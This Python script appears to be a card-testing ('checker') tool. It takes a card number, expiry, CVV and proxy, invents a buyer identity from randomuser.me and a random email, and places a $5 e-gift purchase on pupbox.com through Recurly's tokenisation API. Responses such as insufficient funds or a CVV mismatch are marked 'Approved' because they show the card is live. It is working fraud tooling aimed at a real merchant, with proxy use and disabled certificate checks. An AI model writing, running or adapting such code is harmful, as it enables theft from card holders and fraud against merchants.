import httpx
import random
import string
import asyncio
import json


def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"


async def recurly_gift(cc, mes, ano, cvv, proxy):
    if len(ano) == 4:
        ano = ano[2:]
    if mes.startswith("0") and len(mes) == 2:
        mes = mes[1]

    email = random_email()

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "es-419,es;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    }

    async with httpx.AsyncClient(headers=headers, proxies=proxy, verify=False) as client:
        addr = await client.get('https://randomuser.me/api/1.2/?nat=US')
        street = addr.text.split('"street":"')[1].split('"')[0]
        city = addr.text.split('"city":"')[1].split('"')[0]
        state1 = addr.text.split('"state":"')[1].split('"')[0]
        zipcode = addr.text.split('"postcode":')[1].split(',')[0].strip()
        phone = addr.text.split('"phone":"')[1].split('"')[0]
        name = addr.text.split('"first":"')[1].split('"')[0]
        last = addr.text.split('"last":"')[1].split('"')[0]
        ip = await client.get("https://api.ipify.org/")
        iptext = ip.text
        print(iptext)
        retrys = 3
        while retrys > 0:
            try:
                response = await client.get("https://pupbox.com/gift/")
                break
            except:
                retrys -= 1
                continue

        params = {"cmd": "initialGiftState"}
        retrys = 3
        while retrys > 0:
            try:
                response = await client.get("https://pupbox.com/ajax.php", params=params)
                break
            except:
                retrys -= 1
                continue

        params = {"cmd": "gift-register"}
        data = {
            "session_id": "1727138633822",
            "email": email,
            "password": "$2a$10$7LCey.rwKiijDe2U74.C.O4IWM8S/J/zPIyTalKWB2RMSxWoaSqte",
            "flow": name,
            "from": name,
            "to": last,
            "note": "Gift for you",
            "plan": "1",
            "to_email": email,
        }
        retrys = 3
        while retrys > 0:
            try:
                response = await client.post("https://pupbox.com/ajax.php", params=params, data=data)
                break
            except:
                retrys -= 1
                continue

        data = {
            "first_name": name,
            "last_name": last,
            "country": "US",
            "postal_code": zipcode,
            "number": cc,
            "month": mes,
            "year": ano,
            "cvv": "",
            "version": "4.30.0",
            "key": "ewr1-SVjwyaSF4of0LquOF0PxlF",
            "deviceId": "OaT95Ca4DOwmeMKn",
            "sessionId": "T7hr2uAvuSazcTYG",
            "instanceId": "mu7Gbc3DKNTSptjb",
        }
        retrys = 3
        while retrys > 0:
            try:
                response = await client.post("https://api.recurly.com/js/v1/token", data=data)
                break
            except:
                retrys -= 1
                continue 
        response_json = response.json()
        idd = response_json["id"]

        params = {"cmd": "gift-checkout"}
        data = {
            "country": "US",
            "coupons": "",
            "to_email": email,
            "flow": "egift",
            "from": name,
            "to": last,
            "note": "Gift for you",
            "plan": "1",
            "cc_token": idd,
        }
        retrys = 3
        while retrys > 0:
            try:
                req5 = await client.post("https://pupbox.com/ajax.php", params=params, data=data)
                break
            except:
                retrys -= 1
                continue
        print(req5.text)
        if "wooId" in req5.text or "orderId" in req5.text:
            status = "Approved ✅"
            mensaje = "Charged 5$"
        else:
            mensaje = req5.text.split('"error":"')[1].split('"')[0]
            if "Your transaction was declined due to insufficient funds" in mensaje:
                status = "Approved ✅"
            if "The security code you entered does not match" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status, mensaje
